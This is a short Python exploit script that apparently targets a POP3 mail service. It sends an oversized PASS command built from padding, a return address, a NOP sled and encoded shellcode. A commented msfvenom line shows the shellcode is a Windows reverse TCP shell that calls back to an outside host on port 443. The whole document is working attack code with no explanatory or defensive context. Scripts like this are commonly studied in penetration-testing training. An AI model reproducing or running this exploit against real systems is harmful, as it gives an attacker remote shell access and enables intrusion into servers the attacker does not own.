  
#msfvenom -p windows/shell_reverse_tcp LHOST=1.1.1.1 LPORT=443 -f c -a x86 EXITFUNC=thread --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
#!/usr/bin/python
import socket
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

overflow = ("\xbd\xb1\x84\x1b\x3d\xdd\xc3\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x6e\x12\x83\xc6\x04\x03\xdf\x8a\xf9\xc8\xe3\x7b\x7f"
"\x32\x1b\x7c\xe0\xba\xfe\x4d\x20\xd8\x8b\xfe\x90\xaa\xd9\xf2"
"\x5b\xfe\xc9\x81\x2e\xd7\xfe\x22\x84\x01\x31\xb2\xb5\x72\x50"
"\x30\xc4\xa6\xb2\x09\x07\xbb\xb3\x4e\x7a\x36\xe1\x07\xf0\xe5"
"\x15\x23\x4c\x36\x9e\x7f\x40\x3e\x43\x37\x63\x6f\xd2\x43\x3a"
"\xaf\xd5\x80\x36\xe6\xcd\xc5\x73\xb0\x66\x3d\x0f\x43\xae\x0f"
"\xf0\xe8\x8f\xbf\x03\xf0\xc8\x78\xfc\x87\x20\x7b\x81\x9f\xf7"
"\x01\x5d\x15\xe3\xa2\x16\x8d\xcf\x53\xfa\x48\x84\x58\xb7\x1f"
"\xc2\x7c\x46\xf3\x79\x78\xc3\xf2\xad\x08\x97\xd0\x69\x50\x43"
"\x78\x28\x3c\x22\x85\x2a\x9f\x9b\x23\x21\x32\xcf\x59\x68\x5b"
"\x3c\x50\x92\x9b\x2a\xe3\xe1\xa9\xf5\x5f\x6d\x82\x7e\x46\x6a"
"\x95\xf7\xf9\xab\xc5\x57\x52\x0c\xb5\x17\x02\xe4\xdf\x97\x7d"
"\x14\xe0\x7d\x16\xbf\x1b\x16\xd9\xe8\x22\x9a\xb1\xea\x24\x62"
"\x6f\x62\xc2\x08\x7f\x22\x5d\xa5\xe6\x6f\x15\x54\xe6\xa5\x50"
"\x56\x6c\x4a\xa5\x19\x85\x27\xb5\xce\x65\x72\xe7\x59\x79\xa8"
"\x8f\x06\xe8\x37\x4f\x40\x11\xe0\x18\x05\xe7\xf9\xcc\xbb\x5e"
"\x50\xf2\x41\x06\x9b\xb6\x9d\xfb\x22\x37\x53\x47\x01\x27\xad"
"\x67\x85\xb7\x29\x68\xc0\x41\xd5\xd9\xbd\x17\xea\xd6\x29\x90"
"\x93\x0a\xca\x5f\x4e\x8f\xea\xbd\x5a\xfa\x82\x1b\x0f\x47\xcf"
"\x9b\xfa\x84\xf6\x1f\x0e\x75\x0d\x3f\x7b\x70\x49\x87\x90\x08"
"\xc2\x62\x96\xbf\xe3\xa6")

buffer = "A" * 2606 + "\x8f\x35\x4a\x5f" + "\x90" * 32 + overflow
try:
	print "\nSending evil buffer..."
	s.connect(('192.168.1.224',110))
	data = s.recv(1024)
	s.send('USER username' +'\r\n')
	data = s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	print "\nDone!."
except:
	print "Could not connect to POP3!"
